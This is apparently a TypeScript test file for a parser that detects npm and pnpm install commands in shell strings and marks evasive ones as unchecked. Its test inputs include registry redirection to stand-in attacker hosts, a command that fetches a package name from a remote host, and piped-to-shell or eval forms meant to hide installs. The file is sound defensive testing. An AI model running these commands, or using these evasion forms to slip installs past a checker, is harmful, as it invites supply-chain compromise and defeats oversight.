import { describe, expect, it } from "vitest";
import { installIntents } from "./install-commands.ts";

const at = (command: string) => installIntents(command, "/repo", "/home/u");
const kinds = (command: string) =>
  at(command).map((i) =>
    i.kind === "unchecked"
      ? `unchecked: ${i.reason}`
      : `${i.kind} ${i.dir}${"packages" in i ? ` [${i.packages.join(" ")}]` : ""}`,
  );

describe("installIntents", () => {
  it.each([
    ["npm install lodash", "install /repo [lodash]"],
    ["npm i -D vitest @types/node", "install /repo [vitest @types/node]"],
    ["npm add left-pad@1.3.0", "install /repo [left-pad@1.3.0]"],
    ["npm install", "install /repo []"],
    ["npm install --omit dev", "install /repo []"],
    ["npm ci", "ci /repo"],
    ["npm update", "update /repo []"],
    ["npx cowsay hi", "run /repo [cowsay]"],
    ["npx --yes create-vite@latest app", "run /repo [create-vite@latest]"],
    ["npx -p typescript tsc --version", "run /repo [typescript]"],
    ["npm exec -- prettier --check .", "run /repo [prettier]"],
    ["npm create vite@latest app", "run /repo [create-vite@latest]"],
    ["npm init @scope/app", "run /repo [@scope/create-app]"],
    ["npm --prefix client install axios", "install /repo/client [axios]"],
  ])("finds %s", (command, expected) => {
    expect(kinds(command)).toEqual([expected]);
  });

  it("follows cd, including the nested installs of D20", () => {
    expect(kinds("cd client && npm install && cd ../server && npm ci")).toEqual(
      ["install /repo/client []", "ci /repo/server"],
    );
    expect(kinds("cd ~/work/app; npm i zod")).toEqual([
      "install /home/u/work/app [zod]",
    ]);
  });

  it("keeps a subshell's cd inside it, and is unsure of the directory after one", () => {
    expect(kinds("(cd web && npm i) && npm i")).toEqual([
      "install /repo/web []",
      "unchecked: the directory it runs in is only known when the shell runs",
    ]);
  });

  it("strips wrappers and environment assignments", () => {
    expect(kinds("CI=1 sudo -E npm install -g pnpm")).toEqual([
      "install /repo [pnpm]",
    ]);
    expect(at("sudo npm i -g pnpm")[0]).toMatchObject({ global: true });
  });

  it("looks inside sh -c", () => {
    expect(kinds(`bash -c "cd api && npm install express"`)).toEqual([
      "install /repo/api [express]",
    ]);
  });

  it("ignores commands that install nothing", () => {
    for (const command of [
      "npm test",
      "npm run build",
      "npm init -y",
      "npx",
      "ls && git status",
      "yarn test",
      "echo npm install",
    ])
      expect(at(command)).toEqual([]);
  });

  it.each([
    ["npm install $PKG", "only known when the shell runs"],
    ["npm i $(curl -s x.invalid/name)", "only known when the shell runs"],
    ["cd $DIR && npm install", "directory it runs in"],
    ["npm install --registry https://evil.invalid x", "registry or config"],
    [
      "npm_config_registry=https://evil.invalid npm i x",
      "through the environment",
    ],
    [`eval "npm i x"`, "eval hides"],
    ["yarn", "yarn support is planned (M6)"],
    ["bunx cowsay", "bunx support is planned (M6)"],
    [`npm i "unbalanced`, "could not parse"],
  ])("fails closed on %s", (command, reason) => {
    expect(at(command)).toEqual([
      expect.objectContaining({
        kind: "unchecked",
        reason: expect.stringContaining(reason),
      }),
    ]);
  });

  it.each([
    ["if true; then npm install evil; fi"],
    ["for p in a b; do npm i evil; done"],
    ["f() { npm install evil; }; f"],
    ["! npm i evil"],
    ["timeout 300 npm install evil"],
    ["sudo -u root npm i evil"],
    ["nice -n 10 npm i evil"],
    ["x=$(npm i evil)"],
    ["echo `npm i evil`"],
    ["npm -p install evil"],
    ["npm install -p evil"],
    ["npm upd"],
    ["npm installTest"],
    ["npm cre vite"],
  ])("sees the install in %s (M4 review)", (command) => {
    expect(at(command).length).toBeGreaterThan(0);
    expect(at(command).every((i) => i.kind !== "unchecked")).toBe(true);
  });

  it.each([
    ["bash -lc 'npm install evil'", "install /repo [evil]"],
    ["bash -e -c 'npm i evil'", "install /repo [evil]"],
    ["npm -C /tmp/x install evil", "install /tmp/x [evil]"],
    ["npx evil --package lodash", "run /repo [evil]"],
    ["npm install -p evil", "install /repo [evil]"],
  ])("reads %s the way npm does", (command, expected) => {
    expect(kinds(command)).toEqual([expected]);
  });

  it("treats -L global as a global install", () => {
    expect(at("npm -L global install evil")[0]).toMatchObject({
      kind: "install",
      global: true,
    });
  });

  it.each([
    ["echo 'npm install evil' | sh", "stdin"],
    ["sh <<EOF\nnpm install evil\nEOF", "heredoc"],
    ["n=npm; $n install evil", "only known when the shell runs"],
    ["ls | xargs npm install", "through xargs"],
    ["find . -name x -exec npm i {} \\;", "through find"],
    ["corepack npm install evil", "corepack"],
    ["env -S 'npm install evil'", "env changes"],
    ["npm --proxy-ish x install evil", "takes a value"],
    ["npm audit fix", "audit fix"],
    ["npm dedupe", "dedupe"],
    [
      "npm i @evil/pkg --@evil:registry=https://attacker.invalid/",
      "registry or config",
    ],
    [
      "npm config set registry https://attacker.invalid/ && npm i evil",
      "registry settings",
    ],
    [
      "echo registry=https://attacker.invalid/ > .npmrc && npm i evil",
      "registry settings",
    ],
  ])("fails closed on %s (M4 review)", (command, reason) => {
    expect(at(command)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          kind: "unchecked",
          reason: expect.stringContaining(reason),
        }),
      ]),
    );
  });

  it("leaves heredoc bodies and script files alone", () => {
    expect(at("cat > README.md <<'EOF'\nRun npm install first.\nEOF")).toEqual(
      [],
    );
    expect(at("bash scripts/build.sh && npm test")).toEqual([]);
  });

  it.each([
    ["pnpm add zod", "install pnpm /repo [zod]"],
    ["pnpm i -D vitest", "install pnpm /repo [vitest]"],
    ["pnpm install", "install pnpm /repo []"],
    ["pnpm install --frozen-lockfile", "ci pnpm /repo"],
    ["pnpm up react", "update pnpm /repo [react]"],
    ["pnpm -C web add react", "install pnpm /repo/web [react]"],
    ["pnpm dlx create-vite app", "run pnpm /repo [create-vite]"],
    ["pnpx cowsay hi", "run pnpm /repo [cowsay]"],
    ["pnpm create vite app", "run pnpm /repo [create-vite]"],
  ])("finds pnpm's %s (M6)", (command, expected) => {
    expect(
      at(command).map((i) =>
        i.kind === "unchecked"
          ? `unchecked: ${i.reason}`
          : `${i.kind} ${i.manager ?? "npm"} ${i.dir}${"packages" in i ? ` [${i.packages.join(" ")}]` : ""}`,
      ),
    ).toEqual([expected]);
  });

  it("ignores pnpm commands that install nothing", () => {
    for (const command of [
      "pnpm",
      "pnpm test",
      "pnpm run build",
      "pnpm exec tsc",
      "pnpm why react",
    ])
      expect(at(command)).toEqual([]);
  });

  it.each([
    ["pnpm --registry https://evil.invalid add x", "registry or config"],
    [
      "pnpm_config_registry=https://evil.invalid pnpm add x",
      "through the environment",
    ],
    [
      "pnpm config set registry https://evil.invalid && pnpm add x",
      "registry settings",
    ],
    ["pnpm add $PKG", "only known when the shell runs"],
    ["yarn add react", "yarn support is planned (M6)"],
  ])("fails closed on %s (M6)", (command, reason) => {
    expect(at(command)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          kind: "unchecked",
          reason: expect.stringContaining(reason),
        }),
      ]),
    );
  });
});
